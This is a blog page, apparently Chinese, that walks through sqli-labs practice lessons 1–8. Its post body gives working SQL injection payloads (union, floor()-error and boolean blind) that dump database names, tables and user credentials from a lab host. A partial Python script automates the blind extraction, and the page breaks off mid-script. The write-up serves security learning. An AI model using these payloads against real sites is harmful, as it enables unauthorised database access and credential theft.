@@ -1,0 +1,913 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.5.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.5.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.5.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.5.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="Intro 靶场：http://43.247.91.228:84/  为了方便，做这些题可以利用火狐浏览器的扩展工具hackbar进行get传参  每道题的题目就是提示信息，告诉了我们注入类型  为了帮助我们理解过滤机制，可以在GitHub上下载后端源代码   Less-1 GET-Error based-single quotes-String12345678910111213141516171">
+<meta name="keywords" content="Information Security">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs Less 1-10">
+<meta property="og:url" content="http://yoursite.com/2019/03/05/sqli-labs Less 1-10/index.html">
+<meta property="og:site_name" content="kawhi">
+<meta property="og:description" content="Intro 靶场：http://43.247.91.228:84/  为了方便，做这些题可以利用火狐浏览器的扩展工具hackbar进行get传参  每道题的题目就是提示信息，告诉了我们注入类型  为了帮助我们理解过滤机制，可以在GitHub上下载后端源代码   Less-1 GET-Error based-single quotes-String12345678910111213141516171">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-03-13T10:30:38.040Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sqli-labs Less 1-10">
+<meta name="twitter:description" content="Intro 靶场：http://43.247.91.228:84/  为了方便，做这些题可以利用火狐浏览器的扩展工具hackbar进行get传参  每道题的题目就是提示信息，告诉了我们注入类型  为了帮助我们理解过滤机制，可以在GitHub上下载后端源代码   Less-1 GET-Error based-single quotes-String12345678910111213141516171">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/03/05/sqli-labs Less 1-10/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>sqli-labs Less 1-10 | kawhi</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">kawhi</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">Life is brief,and then you die,you know?</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-首页"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-归档"></i> <br>归档<span class="badge">28</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-分类"></i> <br>分类<span class="badge">11</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-标签"></i> <br>标签<span class="badge">0</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-关于"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-search">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/search/" rel="section"><i class="menu-item-icon fa fa-fw fa-搜索"></i> <br>搜索</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/05/sqli-labs Less 1-10/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="kawhi">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/kawhi.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kawhi">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sqli-labs Less 1-10
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-03-05 21:37:31" itemprop="dateCreated datePublished" datetime="2019-03-05T21:37:31+08:00">2019-03-05</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-03-13 18:30:38" itemprop="dateModified" datetime="2019-03-13T18:30:38+08:00">2019-03-13</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/SQL/" itemprop="url" rel="index"><span itemprop="name">SQL</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><ol>
+<li><p>靶场：<a href="http://43.247.91.228:84/" target="_blank" rel="noopener">http://43.247.91.228:84/</a></p>
+</li>
+<li><p>为了方便，做这些题可以利用火狐浏览器的扩展工具hackbar进行get传参</p>
+</li>
+<li><p>每道题的题目就是提示信息，告诉了我们注入类型</p>
+</li>
+<li><p>为了帮助我们理解过滤机制，可以在GitHub上下载后端源代码</p>
+</li>
+</ol>
+<h2 id="Less-1-GET-Error-based-single-quotes-String"><a href="#Less-1-GET-Error-based-single-quotes-String" class="headerlink" title="Less-1 GET-Error based-single quotes-String"></a>Less-1 GET-Error based-single quotes-String</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#判断注入点及类型</span><br><span class="line">?id=1</span><br><span class="line">?id=1&apos;</span><br><span class="line">根据报错信息得知是单引号型注入</span><br><span class="line"></span><br><span class="line">#猜测表中字段数</span><br><span class="line">?id=1&apos; order by 1--+</span><br><span class="line">?id=1&apos; order by 2--+</span><br><span class="line">?id=1&apos; order by 3--+</span><br><span class="line">?id=1&apos; order by 4--+</span><br><span class="line">到4的时候查询错误，因此字段数为3</span><br><span class="line">每次输出一个记录，猜测内部sql语句为 select .. from .. where id=&apos;&amp;id&apos; limit 0,1;</span><br><span class="line"></span><br><span class="line">#确定字段的显示顺序</span><br><span class="line">?id=0&apos; union select 1,2,3--+</span><br><span class="line">根据访问结果可知2，3两个字段会显示</span><br><span class="line">该语句也可以判断表中的字段数</span><br><span class="line"></span><br><span class="line">#暴库（注意：id=非正确值）</span><br><span class="line">?id=0&apos; union select 1,2,database()--+</span><br><span class="line">得到库名&apos;security&apos;</span><br><span class="line"></span><br><span class="line">#暴表</span><br><span class="line">?id=0&apos; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;--+</span><br><span class="line">暴出表名 emails,referers,uagents,users，猜测users是用户数据表</span><br><span class="line"></span><br><span class="line">#暴字段</span><br><span class="line">?id=0&apos; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;--+</span><br><span class="line">得到表中字段有 id,username,password。</span><br><span class="line"></span><br><span class="line">#暴数据</span><br><span class="line">?id=0&apos; union select 1,2,group_concat(username,&apos; &apos;,password) from users--+</span><br></pre></td></tr></table></figure>
+<p>Question：为什么在暴库时id必须是非正确值？    </p>
+<p>Answer：因为在猜测表中字段数时发现客户端每次返回一条记录，所以在使用union子句查询时如果id为正确值，那么客户端就会返回正确值的记录。只有在id为非正确值时才会返回union子句的查询结果，从而暴出库名。</p>
+<h2 id="Less-2-GET-Error-Based-Intiger-based"><a href="#Less-2-GET-Error-Based-Intiger-based" class="headerlink" title="Less-2 GET-Error Based-Intiger based"></a>Less-2 GET-Error Based-Intiger based</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#判断注入点及类型</span><br><span class="line">?id=1 and 1=1          查询成功</span><br><span class="line">?id=1 and 1=2          查询失败</span><br><span class="line">判断可知是数字型注入，剩余步骤同Less-1，只是不加单引号</span><br></pre></td></tr></table></figure>
+<h2 id="Less-3-GET-Error-based-Single-quotes-with-twist-string"><a href="#Less-3-GET-Error-based-Single-quotes-with-twist-string" class="headerlink" title="Less-3 GET-Error based-Single quotes with twist-string"></a>Less-3 GET-Error based-Single quotes with twist-string</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#判断注入点及类型</span><br><span class="line">?id=1       查询成功</span><br><span class="line">?id=1&apos;      查询失败：&apos;&apos;1&apos;&apos;) LIMIT 0,1&apos;</span><br><span class="line">根据报错信息可以猜测内部sql查询语句为 select .. from .. where id=(&apos;&amp;id&apos;) limit 0,1;</span><br><span class="line">因此在输入的id后加上单引号和右括号，其他同Less-1</span><br><span class="line">例如：?id=1&apos;) union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+<h2 id="Less-4-GET-Error-Based-Double-quotes-String"><a href="#Less-4-GET-Error-Based-Double-quotes-String" class="headerlink" title="Less-4 GET-Error Based-Double quotes-String"></a>Less-4 GET-Error Based-Double quotes-String</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#判断注入点及类型</span><br><span class="line">?id=1        查询成功</span><br><span class="line">?id=1&apos;       查询成功</span><br><span class="line">?id=1&quot;       查询失败：&apos;&quot;1&quot;&quot;) LIMIT 0,1&apos;</span><br><span class="line">根据报错信息可以猜测内部sql查询语句为 select .. from .. where id=(&quot;$id&quot;) limit 0,1;</span><br><span class="line">因此在输入的id后加上双引号和右括号，其他同Less-1</span><br><span class="line">例如：?id=1&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+<h2 id="Less-5-GET-Double-Injection-Single-Quotes-String"><a href="#Less-5-GET-Double-Injection-Single-Quotes-String" class="headerlink" title="Less-5 GET-Double Injection-Single Quotes-String"></a>Less-5 GET-Double Injection-Single Quotes-String</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#判断注入点及类型</span><br><span class="line">?id=1        You are in ...</span><br><span class="line">?id=1&apos;       错误信息：&apos;&apos;1&apos;&apos; LIMIT 0,1&apos;</span><br><span class="line">判断是单引号型注入，但采用常规的union注入发现不管用，因此想到报错注入，这题利用的是floor()报错注入</span><br><span class="line"></span><br><span class="line">#猜测表中字段数，确定字段显示顺序（方法同Less-1）</span><br><span class="line"></span><br><span class="line">#暴库</span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select database()),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">输出信息：Duplicate entry &apos;security 1&apos; for key &apos;group_key&apos;</span><br><span class="line"></span><br><span class="line">#暴表（之后的操作只要修改子查询语句即可）</span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&apos;security&apos;),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">错误信息：Subquery returns more than 1 row（子查询返回多于一行）</span><br><span class="line">因此，添加limit子句来限制单行输出记录</span><br><span class="line"></span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 1,1),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 2,1),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 3,1),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 4,1),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">当limit 4,1 时就没有表暴出。共暴出emails,referers,uagents,users四个表</span><br><span class="line"></span><br><span class="line">#暴字段</span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 1,1),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 3,1),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">共暴出id,password,username三个字段</span><br><span class="line"></span><br><span class="line">#暴数据</span><br><span class="line">?id=1&apos; union select 1,count(*),concat((select concat(username, &apos; &apos;,password) from users limit 0,1),&apos; &apos;,floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br><span class="line">依次修改limit子句就可以暴出所有数据</span><br></pre></td></tr></table></figure>
+<p>关于floor()报错注入，这里有两篇比较好的博客：<br><a href="https://mp.weixin.qq.com/s?__biz=MzA5NDY0OTQ0Mw==&amp;mid=403404979&amp;idx=1&amp;sn=27d10b6da357d72304086311cefd573e&amp;scene=1&amp;srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzA5NDY0OTQ0Mw==&amp;mid=403404979&amp;idx=1&amp;sn=27d10b6da357d72304086311cefd573e&amp;scene=1&amp;srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect</a><br><a href="https://bbs.ichunqiu.com/thread-27209-1-43.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-27209-1-43.html</a></p>
+<h2 id="Less-6-GET-Double-Injection-Double-Quotes-String"><a href="#Less-6-GET-Double-Injection-Double-Quotes-String" class="headerlink" title="Less-6 GET-Double Injection-Double Quotes-String"></a>Less-6 GET-Double Injection-Double Quotes-String</h2><p>这题是双引号型注入，其他和Less-5一样   </p>
+<h2 id="Less-7-GET-Dump-into-outfile-String"><a href="#Less-7-GET-Dump-into-outfile-String" class="headerlink" title="Less-7 GET-Dump into outfile-String"></a>Less-7 GET-Dump into outfile-String</h2><h2 id="Less-8-GET-Blind-Boolian-Based-Singles-Quotes"><a href="#Less-8-GET-Blind-Boolian-Based-Singles-Quotes" class="headerlink" title="Less-8 GET-Blind-Boolian Based-Singles Quotes"></a>Less-8 GET-Blind-Boolian Based-Singles Quotes</h2><ol>
+<li><p>布尔型盲注原理：<br>布尔型盲注即在sql注入过程中，应用程序仅返回true页面和false页面，这时我们无法根据返回页面得到我们需要的数据库信息。但是我们可以构造逻辑判断（比较大小）来一步步脱库。</p>
+</li>
+<li><p>方法：手工注入或者脚本注入，核心思想都是二分法。   </p>
+</li>
+</ol>
+<h3 id="方法一：手工注入"><a href="#方法一：手工注入" class="headerlink" title="方法一：手工注入"></a>方法一：手工注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#判断数据库名长度</span><br><span class="line">?id=1&apos; and length(database())=8--+</span><br><span class="line"></span><br><span class="line">#判断数据库名</span><br><span class="line">?id=1&apos; and left((select database()),1)&lt;&apos;t&apos;--+</span><br><span class="line"></span><br><span class="line">?id=1&apos; and left((select database()),1)=&apos;s&apos;--+</span><br><span class="line"></span><br><span class="line">?id=1&apos; and left((select database()),8)=&apos;security&apos;--+</span><br><span class="line"></span><br><span class="line">#判断数据库中表名</span><br><span class="line">?id=1&apos; and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&apos;r&apos; --+</span><br><span class="line"></span><br><span class="line">#判断表中字段名</span><br><span class="line">?id=1&apos; and left((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 4,1),8)=&apos;password&apos; --+</span><br><span class="line"></span><br><span class="line">#获取数据</span><br><span class="line">?id=1&apos; and left((select password from users order by id limit 0,1),1)=&apos;d&apos; --+</span><br><span class="line"></span><br><span class="line">?id=1&apos; and left((select username from users order by id limit 0,1),1)=&apos;d&apos; --+</span><br></pre></td></tr></table></figure>
+<h3 id="方法二：脚本注入"><a href="#方法二：脚本注入" class="headerlink" title="方法二：脚本注入"></a>方法二：脚本注入</h3><p>由于水平有限脚本没有优化，但还是可以脱库的。另外，由于脱库过程需要一步步进行，所以后面的函数基于前面函数执行获取的数据信息。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database_len</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">		url = <span class="string">"http://43.247.91.228:84/Less-8/index.php"</span></span><br><span class="line">		payload = <span class="string">"?id=1' and length(database())&gt;%s"</span> %i</span><br><span class="line">		<span class="comment"># print(url+payload+'%23')</span></span><br><span class="line">		r = requests.get(url+payload+<span class="string">'%23'</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			print(i)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="comment">#print('false')</span></span><br><span class="line">			print(<span class="string">'database_length:'</span>,i)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">database_len()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database_name</span><span class="params">()</span>:</span></span><br><span class="line">	name = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">			url = <span class="string">"http://43.247.91.228:84/Less-8/index.php"</span></span><br><span class="line">			payload = <span class="string">"?id=1' and substr(database(),%d,1)='%s'"</span> %(j,i)</span><br><span class="line">			<span class="comment"># print(url+'%23')</span></span><br><span class="line">			r = requests.get(url+payload+<span class="string">'%23'</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">				name = name+i</span><br><span class="line">				print(name)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	print(<span class="string">'database_name:'</span>,name)		</span><br><span class="line">database_name()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">table_num</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">		url = <span class="string">"http://43.247.91.228:84/Less-8/index.php"</span></span><br><span class="line">		payload = <span class="string">"?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())&gt;%s"</span> %i</span><br><span class="line">		r = requests.get(url+payload+<span class="string">'%23'</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			print(i)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			print(<span class="string">'table_number:'</span>,i)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">table_num()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">table_name</span><span class="params">()</span>:</span></span><br><span class="line">	name = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">			url = <span class="string">"http://43.247.91.228:84/Less-8/index.php"</span></span><br><span class="line">			payload = <span class="string">"?id=1' and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%s'"</span> %(j,i)</span><br><span class="line">			r = requests.get(url+payload+<span class="string">'%23'</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">				name = name+i</span><br><span class="line">				print(name)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	print(<span class="string">'table_name:'</span>,name)</span><br><span class="line">table_name()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">column_num</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">		url = <span class="string">"http://43.247.91.228:84/Less-8/index.php"</span></span><br><span class="line">		payload = <span class="string">"?id=1' and (select count(column_name) from 